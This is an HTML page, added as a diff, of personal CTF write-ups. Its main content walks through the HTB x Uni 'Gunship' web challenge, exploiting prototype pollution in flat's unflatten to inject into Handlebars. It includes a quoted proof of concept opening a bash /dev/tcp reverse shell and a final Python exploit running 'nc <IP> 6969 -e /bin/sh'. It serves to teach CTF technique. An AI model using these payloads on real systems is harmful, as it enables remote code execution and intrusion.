@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+	<title></title>
+
+	<link rel="stylesheet" href="style.css">
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
+
+</head>
+	<body onload="typeWriter()">
+
+		<div class="navbar">
+
+			<div class="logo">
+				<img src="logo.png">
+			</div>
+
+			<h1>Writeups</h1>
+
+			<div class="main">
+			  <button class="dropbtn" onclick="openNav()">☰</button>
+			</div>
+
+		  <div id="mySidebar"class="sidebar" style="float:right;">
+				<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+	      <a href="index.html">Home</a>
+	      <a href="writeups.html">Writeups</a>
+		  </div>
+
+		</div>
+
+		<button type="button" class="collapsible">HITCOIN CTF</button>
+		<div class="content">
+			<h2>Challenge Name</h2>
+			<p>Here is the writeup</p>
+		</div>
+
+		<button type="button" class="collapsible">HTB x Uni CTF</button>
+		<div class="content">
+			<h2>Welcome</h2>
+			<p><b>Task:</b> Join the HTB x UNI Qualifications discord channel.</p>
+			<p><b>Solution:</b> Fortunately, the very first task was very easy. In fact we had already been told how to join the discord channel. <br>
+			The hardest task was trying to find the actual flag, I found it pretty quickly hidden within rule 5 in the #uni-ctf-rules channel.</p>
+
+			<h2>Gunship</h2>
+			<p>
+				<b>Task:</b> A classmate was assigned with developing a website using a prototype-based language called Javascript. <br>
+				Now we have Gunship, a tribute page to the legendary synthwave band.. what could possibly go wrong? <br>
+			</p>
+			<p>
+				<b>Solution:</b> This part had downloadable files and a docker instance. <br>
+				It looks like they had given us the source for a website, a quick check shows that the docker instance was a synthwave themed website. <br>
+				At the bottom of the page there was a input box titled `Who's your favourite artist?`. <br>
+				Interestingly, the title of the page was `👾 AST Injection 👾`. <br><br>
+				<i>```
+				┌──(kali㉿kali)-[~/writeups] <br>
+				└─$ unzip web_gunship.zip <br>
+				Archive:  web_gunship.zip <br>
+				   creating: web_gunship/ <br>
+				   creating: web_gunship/config/ <br>
+				  inflating: web_gunship/config/supervisord.conf <br>
+				  inflating: web_gunship/Dockerfile <br>
+				  inflating: web_gunship/build-docker.sh <br>
+				   creating: web_gunship/challenge/ <br>
+				 extracting: web_gunship/challenge/flag <br>
+				  inflating: web_gunship/challenge/index.js <br>
+				  inflating: web_gunship/challenge/yarn.lock <br>
+				  inflating: web_gunship/challenge/package.json <br>
+				   creating: web_gunship/challenge/static/ <br>
+				   creating: web_gunship/challenge/static/css/ <br>
+				  inflating: web_gunship/challenge/static/css/main.css <br>
+				   creating: web_gunship/challenge/static/images/ <br>
+				  inflating: web_gunship/challenge/static/images/favicon.png <br>
+				   creating: web_gunship/challenge/static/js/ <br>
+				  inflating: web_gunship/challenge/static/js/main.js <br>
+				   creating: web_gunship/challenge/views/ <br>
+				  inflating: web_gunship/challenge/views/index.html <br>
+				   creating: web_gunship/challenge/routes/ <br>
+				  inflating: web_gunship/challenge/routes/index.js <br>
+				  inflating: web_gunship/entrypoint.sh <br>
+				``` <br><br>
+			</i>
+				In the downloaded files, I could see the dummy flag. <br>
+				Looking at `web_gunship/challenge/routes/index.js`: <br><br>
+			<i>
+				```javascript
+				const path              = require('path'); <br>
+				const express           = require('express'); <br>
+				const handlebars        = require('handlebars'); <br>
+				const { unflatten }     = require('flat'); <br>
+				const router            = express.Router(); <br>
+
+				router.get('/', (req, res) => { <br>
+				    return res.sendFile(path.resolve('views/index.html')); <br>
+				}); <br>
+
+				router.post('/api/submit', (req, res) => { <br>
+				        // unflatten seems outdated and a bit vulnerable to prototype pollution <br>
+				        // we sure hope so that po6ix doesn't pwn our puny app with his AST injection on template engines <br>
+
+				    const { artist } = unflatten(req.body); <br>
+
+				        if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) { <br>
+				                return res.json({ <br>
+				                        'response': handlebars.compile('Hello {{ user }}, thank you for letting us know!')({ user:'guest' }) <br>
+				                }); <br>
+				        } else { <br>
+				                return res.json({ <br>
+				                        'response': 'Please provide us with the full name of an existing member.' <br>
+				                }); <br>
+				        } <br>
+				}); <br>
+
+				module.exports = router; <br>
+				``` <br><br>
+			</i>
+				Here we can see the code for the input box. <br>
+				In the comments we can see a little clue. <br>
+				A quick google search of `po6ix ast injection` revealed https://blog.p6.is/AST-Injection/, a very detailed blog post about AST injection, <br>
+				a method of obtaining RCE in 'well-known' template engines. <br>
+				A brief read of the post revealed exactly what the comment in `index.js` said - unflatten is vulnerable to AST injection. <br>
+				Thankfully, there was a proof of concept. <br><br>
+
+				<i>
+					```python3 <br>
+					import requests <br>
+
+					TARGET_URL = 'http://p6.is:3000' <br>
+
+					# make pollution <br>
+					requests.post(TARGET_URL + '/vulnerable', json = { <br>
+					    "__proto__.type": "Program", <br>
+					    "__proto__.body": [{ <br>
+					        "type": "MustacheStatement", <br>
+					        "path": 0, <br>
+					        "params": [{ <br>
+					            "type": "NumberLiteral", <br>
+					            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)" <br>
+					        }], <br>
+					        "loc": { <br>
+					            "start": 0, <br>
+					            "end": 0 <br>
+					        } <br>
+					    }] <br>
+					}) <br>
+
+					# execute <br>
+					requests.get(TARGET_URL) <br>
+					``` <br><br>
+				</i>
+				I changed the `TARGET_URL` to the docker instance, the page to `/api/submit` and started a reverse listener. <br>
+				I ran it and nothing happened. <br>
+				To see if I could debug what was going on I printed the response <br><br>
+				<i>
+					``` <br>
+					TypeError: Cannot read property &#39;name&#39; of undefined<br>
+					&nbsp; &nbsp;at /app/routes/index.js:17:13<br>
+					&nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br>
+					&nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)<br>
+					&nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)<br>
+					&nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br>
+					&nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:281:22<br>
+					&nbsp; &nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)<br>
+					&nbsp; &nbsp;at next (/app/node_modules/express/lib/router/index.js:275:10)<br>
+					&nbsp; &nbsp;at Function.handle (/app/node_modules/express/lib/router/index.js:174:3)<br>
+					&nbsp; &nbsp;at router (/app/node_modules/express/lib/router/index.js:47:12)<br>
+					``` <br>
+				</i>
+				Looking back at the source of the website I realised I needed to add in `"artist.name": "Westaway"` to the request json. <br><br>
+				<i>``` <br>Error: Command failed: bash -c 'bash -i >& /dev/tcp/<IP>/6969 0>&1'   <br>/bin/sh: bash: not found   <br> <br>    at checkExecSyncError (child_process.js:621:11)   <br>    at Object.execSync (child_process.js:657:15)   <br>    at Object.eval [as main] (eval at createFunctionContext (/app/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:262:23), <anonymous>:10:243)   <br>    at main (/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32)   <br>    at ret (/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12)   <br>    at ret (/app/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:519:21)   <br>    at /app/routes/index.js:19:86   <br>    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)   <br>    at next (/app/node_modules/express/lib/router/route.js:137:13)   <br>    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) <br>```</i> <br>Okay so I could not use a bash back door. <br>Next I tried `nc <IP> 6969 -e /bin/sh`. <br><i>``` <br>┌──(kali㉿kali)-[~] <br>└─$ nc -lvnp 6969 <br>listening on [any] 6969 ... <br>connect to [<IP>] from (UNKNOWN) [<IP>] 51530 <br>ls <br>flagQLjAX <br>index.js <br>package.json <br>routes <br>static <br>views <br>yarn.lock <br>```</i> <br>Result! <br> <br>Final exploit: <br><i>```python3 <br>import requests <br> <br>domain = 'docker.hackthebox.eu' <br>port = '31684' <br>TARGET_URL = f'http://{domain}:{port}' <br> <br>command = "nc <IP> 6969 -e /bin/sh" <br># make pollution <br>res = requests.post(TARGET_URL + '/api/submit', json = { <br>    "artist.name": "Westaway", <br>    "__proto__.type": "Program", <br>    "__proto__.body": [{ <br>        "type": "MustacheStatement", <br>        "path": 0, <br>        "params": [{ <br>            "type": "NumberLiteral", <br>            "value": f"process.mainModule.require('child_process').execSync(`{command}`)" <br>        }], <br>        "loc": { <br>            "start": 0, <br>            "end": 0 <br>        } <br>    }] <br>}) <br>print(res.text) <br> <br># execute <br>res = requests.get(TARGET_URL) <br>```</i> <br> <br>
+			</p>
+		</div>
+
+
+		<script src="main.js"></script>
+
+	</body>
+</html>
